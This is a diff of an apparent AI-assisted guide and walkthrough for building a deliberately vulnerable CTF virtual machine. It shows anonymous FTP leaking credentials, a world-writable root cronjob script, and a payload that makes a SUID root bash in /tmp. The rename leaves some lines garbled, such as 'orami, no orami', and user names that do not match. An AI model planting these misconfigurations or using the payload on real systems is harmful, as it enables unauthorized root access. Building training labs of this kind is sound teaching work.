@@ -34,7 +34,7 @@ Diseñar una máquina con:
   ------------------------- -----------------------------------------------------------
   Sistema base              Ubuntu Server 20.04 (recomendado por estabilidad)
   Servicio vulnerable       vsftpd 3.0.3 con login anónimo habilitado
-  Usuario no-root           *thmuser* con */home/oramiuser/user.txt*
+  Usuario no-root           *orami* con */home/oramiuser/user.txt*
   Flag de root              */root/root.txt*
   Escalada de privilegios   Mediante una tarea en *cron* o binario SUID mal protegido
   ------------------------- -----------------------------------------------------------
@@ -54,7 +54,7 @@ Crea una VM en VirtualBox, VMware o KVM con Ubuntu Server 20.04:
 
 *\# Como root:*
 
-*adduser thmuser*
+*adduser orami*
 
 *echo \"technova{this_is_the_user_flag}\" \> /home/oramiuser/user.txt*
 
@@ -96,7 +96,7 @@ Asegúrate de configurar estas líneas:
 
 *chmod -R 777 /srv/ftp*
 
-*echo \"credenciales: thmuser:pass123\" \> /srv/ftp/files/leeme.txt*
+*echo \"credenciales: orami:pass123\" \> /srv/ftp/files/leeme.txt*
 
 También puedes esconder un script *.sh* con una reverse shell o pistas:
 
@@ -106,9 +106,9 @@ También puedes esconder un script *.sh* con una reverse shell o pistas:
 
 ### 4. **Configurar SSH**
 
-Asegúrate de que *thmuser* pueda acceder vía SSH con contraseña:
+Asegúrate de que *orami* pueda acceder vía SSH con contraseña:
 
-*passwd thmuser \# usa la misma que dejaste en el FTP*
+*passwd orami \# usa la misma que dejaste en el FTP*
 
 *nano /etc/ssh/sshd_config*
 
@@ -204,7 +204,7 @@ Perfecto, aquí tienes una **plantilla profesional para ***README.md***** orient
 
 *- Objetivo: Boot-to-Root*
 
-*- Usuarios implicados: 1 (\`thmuser\`)*
+*- Usuarios implicados: 1 (\`orami\`)*
 
 *\-\--*
 
@@ -402,7 +402,7 @@ Activa SSH (si no está):
 
 ### 👤 Paso 4: Crear el usuario vulnerable y las flags
 
-*sudo adduser thmuser*
+*sudo adduser orami*
 
 *echo \"technova{user_flag_here}\" \| sudo tee /home/oramiuser/user.txt*
 
@@ -1411,7 +1411,7 @@ Una vez dentro, verifica:
 
 *whoami*
 
-*thmuser*
+*orami*
 
 *cat \~/user.txt*
 
@@ -1472,11 +1472,11 @@ Esto revela 3 condiciones que crean la vulnerabilidad:
 
 1. Un cronjob ejecuta `backup.sh` como **root** cada minuto
 2. El script tiene permisos **777** (cualquier usuario puede modificarlo)
-3. Como thmuser puedes sobreescribir el script y cron lo ejecutará con privilegios de root
+3. Como orami puedes sobreescribir el script y cron lo ejecutará con privilegios de root
 
 ## 💣 Paso 6: Escalada de privilegios (cronjob vulnerable)
 
-Edita el script como *thmuser*:
+Edita el script como *orami*:
 
 *echo \'#!/bin/bash\' \> /usr/local/bin/backup.sh*
 
@@ -1515,7 +1515,7 @@ Una vez ejecutado:
   --- ----------------------------- -----------------------------------------
   1   Nmap                          Descubres FTP y SSH
   2   FTP anónimo                   Descubres credenciales
-  3   SSH con credenciales          Acceso como *thmuser*
+  3   SSH con credenciales          Acceso como *orami*
   4   Por qué buscar cronjobs       Razonamiento detrás de la escalada
   5   Enumerar cronjobs             Encuentras un script editable por todos
   6   Insertas payload              *chmod +s* a */tmp/rootbash*
@@ -1573,7 +1573,7 @@ Una vez ejecutado:
 
 *- \*\*Usuarios:\*\**
 
-*  - \`thmuser\` / \`123456\`*
+*  - \`orami\` / \`123456\`*
 
 *\-\--*
 
@@ -1619,7 +1619,7 @@ Verificamos el usuario:
 
 *whoami*
 
-*\# thmuser*
+*\# orami*
 
 Leer flag de usuario:
 
@@ -1669,7 +1669,7 @@ ls -l /usr/local/bin/backup.sh
 
 ### 💣 Paso 6 - Modificar Script de Cronjob
 
-Editamos el script como *thmuser*:
+Editamos el script como *orami*:
 
 *echo -e \'#!/bin/bash\\ncp /bin/bash /tmp/rootbash\\nchmod +s /tmp/rootbash\' \> /usr/local/bin/backup.sh*
 
@@ -1707,7 +1707,7 @@ Leer flag de root:
 
   ----------------- --------------------------------------------
   IP Objetivo       192.168.1.100 (variable)
-  Usuario inicial   *thmuser*
+  Usuario inicial   *orami*
   Servicio clave    FTP (login anónimo)
   Escalada          Cronjob ejecutado por root
   Flags             */home/oramiuser/user.txt*, */root/root.txt*
@@ -1840,7 +1840,7 @@ Una vez dentro:
 
 ### ❓ Pregunta:
 
-> ¿Cuál es la contraseña del usuario *thmuser* encontrada en *leeme.txt*?
+> ¿Cuál es la contraseña del usuario *orami* encontrada en *leeme.txt*?
 
 ✅ **Respuesta esperada:**
 
@@ -1880,7 +1880,7 @@ Buscar vectores de escalada de privilegios.
 
 ### 📘 Descripción:
 
-Una vez con acceso como *thmuser*, debes buscar formas de escalar privilegios.\
+Una vez con acceso como *orami*, debes buscar formas de escalar privilegios.\
 En esta máquina, la clave está en **cronjobs mal configurados**.
 
 ### 🔍 Sugerencias de comandos:
@@ -1905,7 +1905,7 @@ Modificar el script vulnerable y obtener una shell como root.
 
 ### 📘 Descripción:
 
-Como *thmuser*, puedes editar el script */usr/local/bin/backup.sh*.\
+Como *orami*, puedes editar el script */usr/local/bin/backup.sh*.\
 Vamos a insertar un payload para obtener una shell privilegiada.
 
 ### 🛠️ Payload sugerido:
@@ -2017,7 +2017,7 @@ Then:
 
 ### ❓ Question:
 
-> What password is revealed for the user *thmuser*?
+> What password is revealed for the user *orami*?
 
 ✅ **Answer:**
 
@@ -2173,7 +2173,7 @@ Connect to the FTP service as an anonymous user and navigate to the */files* dir
 
 ### ❓ Question:
 
-> What password is revealed for the user *thmuser*?
+> What password is revealed for the user *orami*?
 
 ✅ **Answer:**
 
@@ -2187,7 +2187,7 @@ Use the leaked credentials to access the system via SSH and read the *user.txt* 
 
 ### 📘 Description:
 
-With the password obtained from the FTP service, connect via SSH as the user *thmuser* and retrieve the first flag from the user\'s home directory.
+With the password obtained from the FTP service, connect via SSH as the user *orami* and retrieve the first flag from the user\'s home directory.
 
 ### ❓ Question:
 
@@ -2205,7 +2205,7 @@ Identify potential privilege escalation paths through local enumeration.
 
 ### 📘 Description:
 
-After accessing the machine as *thmuser*, begin enumerating system configurations to find misconfigurations. In this case, a cron job running as root is the key.
+After accessing the machine as *orami*, begin enumerating system configurations to find misconfigurations. In this case, a cron job running as root is the key.
 
 ### ❓ Question:
 
@@ -2375,7 +2375,7 @@ With root access, we can now retrieve the second and final flag:
   --- ------------------------------------ ----------------------------
   1   Service enumeration with Nmap        Found FTP and SSH
   2   Anonymous FTP access                 Leaked user credentials
-  3   SSH login with leaked creds          Gained access as *thmuser*
+  3   SSH login with leaked creds          Gained access as *orami*
   4   Found vulnerable root cronjob        */usr/local/bin/backup.sh*
   5   Injected payload for root shell      Root via cronjob
   6   Captured *user.txt* and *root.txt*   Machine fully pwned ✅
@@ -2967,13 +2967,13 @@ Gracias por compartir toda la salida, está muy clara. Lo que estás viendo es u
 ## 🔍 Lo que sabemos:
 
 -   ✅ FTP **funciona bien**: pudiste conectarte como *anonymous* y descargar *readme.txt* y *shell.sh*.
--   ❌ SSH **falla con el usuario ***thmuser*****, mostrando:
+-   ❌ SSH **falla con el usuario ***orami*****, mostrando:
 
 *Permission denied, please try again.*
 
 ## 🧠 Posibles causas y soluciones
 
-### 🔐 1. **Contraseña incorrecta para ***thmuser*****
+### 🔐 1. **Contraseña incorrecta para ***orami*****
 
 Asegúrate de que el archivo *readme.txt* realmente contenga:
 
@@ -2987,17 +2987,17 @@ Y confirma que estás ingresando la contraseña **exactamente como aparece**, si
 
 > ⚠️ Algunos errores comunes:
 
--   > Escribir mal el usuario: *thmuser*, no *ThmUser*
+-   > Escribir mal el usuario: *orami*, no *orami*
 
--   > Confundir *123456* con *12345* o con *thmuser123*
+-   > Confundir *123456* con *12345* o con *orami123*
 
 -   > Tener espacios invisibles al copiar/pegar
 
-### 🧪 2. **La contraseña del usuario ***thmuser*** fue cambiada o no configurada**
+### 🧪 2. **La contraseña del usuario ***orami*** fue cambiada o no configurada**
 
 En tu máquina vulnerable, ejecuta (como root o desde la consola local):
 
-*sudo passwd thmuser*
+*sudo passwd orami*
 
 Y establece la contraseña que quieras (ej: *123456*).
 
@@ -3021,27 +3021,27 @@ Si modificas algo, reinicia SSH:
 
 *sudo systemctl restart ssh*
 
-### 🧪 4. **¿El usuario ***thmuser*** existe realmente?**
+### 🧪 4. **¿El usuario ***orami*** existe realmente?**
 
 Desde la VM (si tienes acceso directo o root):
 
-*id thmuser*
+*id orami*
 
 Debe mostrar:
 
-*uid=1001(thmuser) gid=1001(thmuser) groups=1001(thmuser)*
+*uid=1001(orami) gid=1001(orami) groups=1001(orami)*
 
 Si dice \"no such user\", crea al usuario:
 
-*sudo adduser thmuser*
+*sudo adduser orami*
 
 *\# Set password to: 123456*
 
 ## ✅ Pasos para solucionar
 
 1.  Confirma que el archivo *readme.txt* diga exactamente la contraseña.
-2.  Asegúrate de que *thmuser* exista en el sistema.
-3.  Si puedes entrar como root o usuario local, usa *passwd thmuser* para establecer la contraseña correcta.
+2.  Asegúrate de que *orami* exista en el sistema.
+3.  Si puedes entrar como root o usuario local, usa *passwd orami* para establecer la contraseña correcta.
 4.  Asegúrate de que *PasswordAuthentication* esté habilitado en SSH.
 5.  Intenta de nuevo:
 
@@ -3049,7 +3049,7 @@ Si dice \"no such user\", crea al usuario:
 
 *\# Password: 123456*
 
-¿Quieres que te dé un script para crear el usuario *thmuser*, ponerle la contraseña, y dejar SSH listo automáticamente?
+¿Quieres que te dé un script para crear el usuario *orami*, ponerle la contraseña, y dejar SSH listo automáticamente?
 
 Gracias por confirmar el contenido de *readme.txt* ✅
 
@@ -3057,7 +3057,7 @@ Gracias por confirmar el contenido de *readme.txt* ✅
 
 Esto confirma que:
 
--   El usuario es *thmuser*
+-   El usuario es *orami*
 -   La contraseña es *123456*
 
 Sin embargo, **el acceso SSH te está fallando**, lo que indica un **problema interno en la máquina vulnerable** (no del lado del cliente).
@@ -3066,7 +3066,7 @@ Sin embargo, **el acceso SSH te está fallando**, lo que indica un **problema in
 
 Necesitas asegurarte de que:
 
-1.  **El usuario ***thmuser*** existe**
+1.  **El usuario ***orami*** existe**
 2.  **La contraseña es correcta**
 3.  **SSH permite el acceso por contraseña**
 
@@ -3074,21 +3074,21 @@ Necesitas asegurarte de que:
 
 En tu máquina vulnerable:
 
-*id thmuser*
+*id orami*
 
 Si obtienes algo como:
 
-*id: 'thmuser': no such user*
+*id: 'orami': no such user*
 
 Entonces crea al usuario con:
 
-*sudo adduser thmuser*
+*sudo adduser orami*
 
 *\# Set password: 123456*
 
 ### 🔧 Paso 2: Reestablece la contraseña por si acaso
 
-*sudo passwd thmuser*
+*sudo passwd orami*
 
 *\# Type: 123456*
 
@@ -3142,14 +3142,14 @@ Aquí está un resumen de lo que lograste --- ideal también para documentarlo c
 
 ## ✅ Confirmaciones técnicas:
 
--   El usuario *thmuser* existe ✅
+-   El usuario *orami* existe ✅
 -   Tiene UID propio y pertenece a grupo *users* ✅
 -   SSH permite login por contraseña ✅
 -   La flag *user.txt* está accesible y entregada ✅
 
 ### 🚀 Próximo paso:
 
-Ya que estás autenticado como *thmuser*, ahora toca:
+Ya que estás autenticado como *orami*, ahora toca:
 
 1.  **Enumerar el sistema** para encontrar cómo escalar privilegios.
 2.  Encontrar el cronjob vulnerable o binario SUID mal configurado.
@@ -3174,7 +3174,7 @@ Porque aún **no has creado esa parte del reto** en tu máquina vulnerable. Es n
 
 ## 🛠️ Solución: crear el cronjob vulnerable
 
-Vamos a configurarlo paso a paso **como root dentro de la VM**, para que luego el atacante (*thmuser*) pueda explotarlo.
+Vamos a configurarlo paso a paso **como root dentro de la VM**, para que luego el atacante (*orami*) pueda explotarlo.
 
 ## ✅ Paso 1: Crear el script */usr/local/bin/backup.sh*
 
@@ -3198,7 +3198,7 @@ Vamos a configurarlo paso a paso **como root dentro de la VM**, para que luego e
 
 ## ✅ Paso 3: Esperar 1 minuto y explotar
 
-Como *thmuser*, modifica el script:
+Como *orami*, modifica el script:
 
 *echo -e \'#!/bin/bash\\ncp /bin/bash /tmp/rootbash\\nchmod +s /tmp/rootbash\' \> /usr/local/bin/backup.sh*
 
@@ -3226,7 +3226,7 @@ Gracias por la salida. El mensaje:
 
 *-bash: /usr/local/bin/backup.sh: Permission denied*
 
-confirma que el usuario *thmuser* **no tiene permisos** para escribir en */usr/local/bin/*.
+confirma que el usuario *orami* **no tiene permisos** para escribir en */usr/local/bin/*.
 
 Esto es **correcto** y esperado desde el punto de vista de seguridad real\...\
 💥 Pero como estás construyendo una máquina **vulnerable intencionalmente**, **tú (como root) necesitas crear el escenario mal configurado**.
@@ -3265,14 +3265,14 @@ Accede como *root* o usa *sudo* desde dentro de la VM y ejecuta el siguiente **s
 
 *chmod 644 /etc/cron.d/rootjob*
 
-*echo \"\[✓\] Cronjob installed. Wait 1 minute and run /tmp/rootbash -p as thmuser.\"*
+*echo \"\[✓\] Cronjob installed. Wait 1 minute and run /tmp/rootbash -p as orami.\"*
 
 ## ✅ Resultado:
 
 -   El archivo */usr/local/bin/backup.sh* es **modificable por cualquiera** (*777*) ✅
 -   El cronjob ejecuta ese script **cada minuto como root** ✅
 
-## ✅ Ahora, como *thmuser*, puedes:
+## ✅ Ahora, como *orami*, puedes:
 
 1.  **Modificar el script:**
 
@@ -3320,7 +3320,7 @@ Es decir: **5 asteriscos separados por espacios**, luego el usuario (*root*), lu
 
 3.  Guarda con *Ctrl + O*, luego ENTER, luego *Ctrl + X*.
 
-## ✅ Luego, como *thmuser*:
+## ✅ Luego, como *orami*:
 
 1.  **Escribe tu payload:**
 
@@ -3349,8 +3349,8 @@ Es decir: **5 asteriscos separados por espacios**, luego el usuario (*root*), lu
 
 Te lo dejo preparado si me dices \"sí\".
 
-Gracias por compartir todo. Lo que estás viendo es **totalmente coherente con una máquina segura**: los archivos que pertenecen a *root* no pueden ser modificados por el usuario *thmuser*.\
-Pero como estás creando una **máquina vulnerable intencionadamente**, necesitas forzar esa condición para que *thmuser* *sí* pueda modificar el script */usr/local/bin/backup.sh*.
+Gracias por compartir todo. Lo que estás viendo es **totalmente coherente con una máquina segura**: los archivos que pertenecen a *root* no pueden ser modificados por el usuario *orami*.\
+Pero como estás creando una **máquina vulnerable intencionadamente**, necesitas forzar esa condición para que *orami* *sí* pueda modificar el script */usr/local/bin/backup.sh*.
 
 ## 🔥 Problema actual:
 
@@ -3358,7 +3358,7 @@ Tu archivo */usr/local/bin/backup.sh* tiene estos permisos:
 
 *-rw-r\--r\-- 1 root root \...*
 
-Y tú estás intentando escribir en él como *thmuser*:
+Y tú estás intentando escribir en él como *orami*:
 
 *echo -e \'#!/bin/bash\\ncp /bin/bash /tmp/rootbash\\nchmod +s /tmp/rootbash\' \> /usr/local/bin/backup.sh*
 
@@ -3386,9 +3386,9 @@ El archivo debe quedar con estos permisos:
 
 *-rwxrwxrwx 1 root root \... /usr/local/bin/backup.sh*
 
-Así cualquier usuario, incluyendo *thmuser*, puede sobrescribirlo.
+Así cualquier usuario, incluyendo *orami*, puede sobrescribirlo.
 
-### 🧪 Prueba (como *thmuser*):
+### 🧪 Prueba (como *orami*):
 
 *echo -e \'#!/bin/bash\\ncp /bin/bash /tmp/rootbash\\nchmod +s /tmp/rootbash\' \> /usr/local/bin/backup.sh*
 
@@ -3412,7 +3412,7 @@ Perfecto. El cronjob ya está bien configurado:
 
 *\* \* \* \* \* root /usr/local/bin/backup.sh*
 
-🔒 **Pero aún no puedes modificar el script como ***thmuser***** porque **los permisos del archivo no permiten escritura a otros usuarios**.
+🔒 **Pero aún no puedes modificar el script como ***orami***** porque **los permisos del archivo no permiten escritura a otros usuarios**.
 
 ## ✅ Solución final (como *root* o usando *sudo* dentro de la VM):
 
@@ -3422,7 +3422,7 @@ Para que la vulnerabilidad funcione (y se pueda explotar en technova, por ejempl
 
 *sudo chmod 777 /usr/local/bin/backup.sh*
 
-✅ Esto le da permisos de escritura al usuario *thmuser*.
+✅ Esto le da permisos de escritura al usuario *orami*.
 
 ## ✅ Verifica los permisos:
 
@@ -3432,7 +3432,7 @@ Debe decir:
 
 *-rwxrwxrwx 1 root root \...*
 
-## ✅ Ahora, como *thmuser*, ejecuta:
+## ✅ Ahora, como *orami*, ejecuta:
 
 *echo -e \'#!/bin/bash\\ncp /bin/bash /tmp/rootbash\\nchmod +s /tmp/rootbash\' \> /usr/local/bin/backup.sh*
 
@@ -3468,9 +3468,9 @@ Tú ya hiciste esto correctamente:
 
 *\* \* \* \* \* root /usr/local/bin/backup.sh*
 
-Pero aún **NO puedes escribir ni cambiar permisos del archivo ***/usr/local/bin/backup.sh*****, porque sigue siendo propiedad de *root* y sin permisos de escritura para *thmuser*.
+Pero aún **NO puedes escribir ni cambiar permisos del archivo ***/usr/local/bin/backup.sh*****, porque sigue siendo propiedad de *root* y sin permisos de escritura para *orami*.
 
-## 🔍 Verifica permisos actuales (como *thmuser*):
+## 🔍 Verifica permisos actuales (como *orami*):
 
 *ls -l /usr/local/bin/backup.sh*
 
@@ -3488,9 +3488,9 @@ Entra como *root* o usa *sudo* si tienes acceso dentro de la máquina y ejecuta 
 
 *sudo chmod 777 /usr/local/bin/backup.sh*
 
-Esto es lo que **permite al usuario ***thmuser*** sobrescribir el archivo** para explotar el cronjob.
+Esto es lo que **permite al usuario ***orami*** sobrescribir el archivo** para explotar el cronjob.
 
-## ✅ Comprobación (como *thmuser*):
+## ✅ Comprobación (como *orami*):
 
 1.  Verifica que los permisos estén así:
 
@@ -3529,10 +3529,10 @@ Puedo darte un pequeño script para configurar **todo el entorno de escalada des
   ---------------------------------------------- ----------------------------------
   ✅ FTP anónimo activo                          Funcional
   ✅ Credenciales filtradas                      *oramiuser:123456* en *readme.txt*
-  ✅ SSH acceso como *thmuser*                   Funcional
+  ✅ SSH acceso como *orami*                   Funcional
   ✅ *user.txt* leída                            ✓ *technova{user_flag_is_here}*
   ✅ Cronjob vulnerable creado                   ✓
-  ✅ Script *backup.sh* editable por *thmuser*   ✓
+  ✅ Script *backup.sh* editable por *orami*   ✓
   ✅ Escalada a root con *SUID*                  ✓
   ✅ *root.txt* capturada                        ✓ *technova{root_flag_is_here}*
   ---------------------------------------------- ----------------------------------
@@ -3602,7 +3602,7 @@ Si aún no lo subiste, puedo entregarte ahora mismo el write-up completo en form
 Puedo darte un script *.sh* que:
 
 -   Instale *vsftpd* correctamente
--   Cree el usuario *thmuser*
+-   Cree el usuario *orami*
 -   Configure el cronjob vulnerable
 -   Genere las flags *user.txt* y *root.txt*
 -   Deje todo listo en **1 solo paso**
@@ -3677,7 +3677,7 @@ Este script:
 
 -   Instala *vsftpd*
 -   Configura FTP anónimo
--   Crea *thmuser* con SSH
+-   Crea *orami* con SSH
 -   Prepara cronjob vulnerable
 -   Crea flags *user.txt* y *root.txt*
 
@@ -3747,7 +3747,7 @@ Obtener dos banderas:
 
 ✅ ¡Tenemos credenciales para intentar en SSH!
 
-# 🔐 Fase 3: Acceso SSH como *thmuser*
+# 🔐 Fase 3: Acceso SSH como *orami*
 
 ### 🛠️ Herramienta: *ssh*
 
@@ -3791,7 +3791,7 @@ El script *backup.sh* tiene permisos **777** (escribible por todos):
 
 El cronjob se ejecuta **cada minuto como root**, lo que nos permite inyectar una **SUID shell**.
 
-### 🧨 Sobrescribimos el script como *thmuser*:
+### 🧨 Sobrescribimos el script como *orami*:
 
 *echo -e \'#!/bin/bash\\ncp /bin/bash /tmp/rootbash\\nchmod +s /tmp/rootbash\' \> /usr/local/bin/backup.sh*
 
@@ -4023,7 +4023,7 @@ Tú ya estás creando una room, así que sí:\
 🔹 Puedes agregar writeups, tareas, flags y el archivo OVA o VDI.\
 🔹 Es la plataforma más accesible para estudiantes.
 
-👉 *Nota:* La room debe ser aprobada por el equipo de THM.
+👉 *Nota:* La room debe ser aprobada por el equipo de technova.
 
 # ✅ **2. VulnHub**
 
@@ -4032,7 +4032,7 @@ Tú ya estás creando una room, así que sí:\
 ✔ Aceptan imágenes tipo **OVA, OVF, VMDK**\
 ✔ Total libertad creativa\
 ✔ Los usuarios descargan la máquina y la ejecutan localmente\
-✔ No requiere revisión tan estricta como THM
+✔ No requiere revisión tan estricta como technova
 
 Página: <https://www.vulnhub.com/>
 
